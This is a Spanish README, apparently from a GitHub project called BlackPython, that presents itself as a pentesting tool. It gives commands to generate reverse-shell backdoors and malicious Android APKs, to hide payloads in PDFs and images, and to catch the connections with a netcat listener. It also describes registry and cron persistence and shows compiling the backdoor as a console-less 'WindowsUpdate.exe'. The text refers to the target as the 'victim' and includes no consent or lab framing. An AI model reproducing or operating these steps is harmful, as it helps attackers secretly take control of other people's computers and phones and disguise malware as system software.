# BlackPython 🐍

Herramienta avanzada para pruebas de penetración y seguridad ofensiva.

## Características
- Generador de backdoors multiplataforma
- Creación de APKs maliciosos para Android
- Camuflaje de payloads en archivos legítimos

## Instalación
```bash
git clone https://github.com/franquitoloco8/BlackPython.git
cd BlackPython
python setup.py

## USO

🛠 Configuración Inicial
1. Clona el repositorio (si estás en otra máquina):
bash

git clone https://github.com/franquitoloco8/BlackPython.git
cd BlackPython

2. Crea un entorno virtual (para aislar dependencias):
bash

python3.10 -m venv .venv  # Crea el entorno
source .venv/bin/activate  # Linux/macOS
# O en Windows:
.venv\Scripts\activate

3. Instala dependencias:
bash
# NECESITAS PYTHON 3.10.13
# Instalar pyenv y Python 3.10.13
git clone https://github.com/pyenv/pyenv.git ~/.pyenv
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 3.10.13

pip install -r requirements.txt

🚀 Puesta en Marcha
▶ 1. Generar un Backdoor (Windows/Linux/macOS)
bash

python main.py backdoor --host "TU_IP_PÚBLICA" --port 4444

    Reemplaza TU_IP_PÚBLICA con tu IP o un dominio de Ngrok (ej: 0.tcp.eu.ngrok.io).

    Para probar localmente, usa 127.0.0.1.

▶ 2. Generar un APK malicioso (Android)
bash

python main.py android --lhost "TU_IP" --lport 4444

    El APK se generará en android/payload.apk.

    Requisito: Necesitarás tener instalado:

        Kotlin Compiler (kotlinc)

        Android SDK (para compilar a APK).

▶ 3. Camuflar un Payload en un Archivo (PDF/Imagen)
bash

python main.py bind --file documento.pdf --payload backdoor.py --output documento_infectado.pdf

    El archivo documento_infectado.pdf contendrá el backdoor oculto.

🔍 Pruebas de Funcionamiento
✔ 1. Para el Backdoor:

    En tu máquina (atacante), escucha conexiones:
    bash

    nc -lvnp 4444

    En la máquina víctima, ejecuta el backdoor o abre el archivo infectado.

✔ 2. Para el APK:

    Instala payload.apk en un Android (emulador o dispositivo físico).

    Al ejecutarse, se conectará a tu servidor (necesitas tener nc escuchando).

📌 Notas Clave

    Persistencia:

        El backdoor se auto-instala en:

            Windows: Registro (HKCU\...\Run).

            Linux: Cron job (/etc/cron.hourly/).

    Ocultamiento:

        Los payloads en PDF/imágenes usan esteganografía (metadatos o LSB).

    Para Android:

        Si no tienes Kotlin instalado, usa Termux en Android:
        bash

pkg install kotlin -y



comandos raros





1. En tu sistema Linux (Arch Linux):
bash

# Instalar Wine y dependencias básicas
sudo pacman -S wine wine-mono wine-gecko qemu-full

# Instalar mingw-w64 (para compilación cruzada alternativa)
sudo pacman -S mingw-w64

# Instalar Python 3.10 para Wine (desde el .exe)
wget https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe
WINEPREFIX=~/.winepy3 wine python-3.10.0-amd64.exe

2. En tu entorno Python (venv):
bash

# Crear entorno virtual (si no lo tenías)
python -m venv .venv
source .venv/bin/activate  # Linux

# Instalar dependencias del proyecto
pip install -r requirements.txt  # Contenido de requirements.txt ya lo compartiste

# Instalar PyInstaller directamente (por si acaso)
pip install pyinstaller==5.13.0

# Instalar cryptography (para el módulo de cifrado)
pip install cryptography==38.0.4

3. En el entorno Wine:
bash

# Configurar Wine (primera vez)
WINEPREFIX=~/.winepy3 WINEARCH=win64 winecfg

# Instalar PyInstaller dentro de Wine
WINEPREFIX=~/.winepy3 wine pip install pyinstaller

# Instalar dependencias del proyecto en Wine
WINEPREFIX=~/.winepy3 wine pip install -r requirements.txt

4. Comandos clave para compilar:
bash

# Compilar con Wine (debug)
WINEPREFIX=~/.winepy3 wine pyinstaller --onefile --debug=all --name Backdoor core/backdoor.py

# Compilar con Wine (versión final)
WINEPREFIX=~/.winepy3 wine pyinstaller --onefile --noconsole --name WindowsUpdate core/backdoor.py

# Alternativa con mingw-w64 (si Wine falla)
x86_64-w64-mingw32-gcc -o backdoor.exe tu_codigo_fuente.c -lws2_32

5. Comandos para probar/depurar:
bash

# Verificar conexión desde Linux (antes de ejecutar el backdoor)
nc -lvnp 4444

# Ejecutar el .exe en Windows con logs (CMD administrativo)
WindowsUpdate.exe > log.txt 2>&1

Notas clave:

    Python en Wine: Instalaste manualmente Python 3.10 desde el .exe en Wine.

    Dependencias críticas: cryptography y pyinstaller fueron esenciales.
